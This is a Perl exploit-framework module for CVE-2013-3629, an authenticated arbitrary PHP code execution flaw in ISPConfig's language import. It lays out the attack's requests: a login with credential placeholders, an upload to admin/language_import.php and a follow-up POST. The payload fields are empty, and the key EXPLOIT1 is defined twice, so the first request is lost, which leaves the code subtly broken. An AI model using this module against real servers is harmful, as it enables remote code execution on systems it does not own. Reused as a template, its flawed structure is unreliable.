package ISPCONFIG::MSF::IspconfigPhpExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "IspconfigPhpExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3629",
  DESCRIPTION => "

      ISPConfig allows an authenticated administrator to export language settings into a PHP script

      which is intended to be reuploaded later to restore language settings. This feature

      can be abused to run aribitrary PHP code remotely on the ISPConfig server.



      This module was tested against version 3.0.5.2.

      ",
  MSF_MODULE => "ispconfig_php_exec",
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  TITLE => "ISPConfig Authenticated Arbitrary PHP Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'content.php',
      PAYLOAD      => 'username=__USERNAME__&passwort=__PASSWORD__&s_mod=login&s_pg=index',
      TEXT   => 'Sending Exploit #1 Request : [POST] /content.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'admin/language_import.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /admin/language_import.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'multipart/form-data; boundary=_Part_221_1326264460_3622605362',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'admin/language_complete.php',
      PAYLOAD      => 'lng_select=es',
      TEXT   => 'Sending Exploit #3 Request : [POST] /admin/language_complete.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
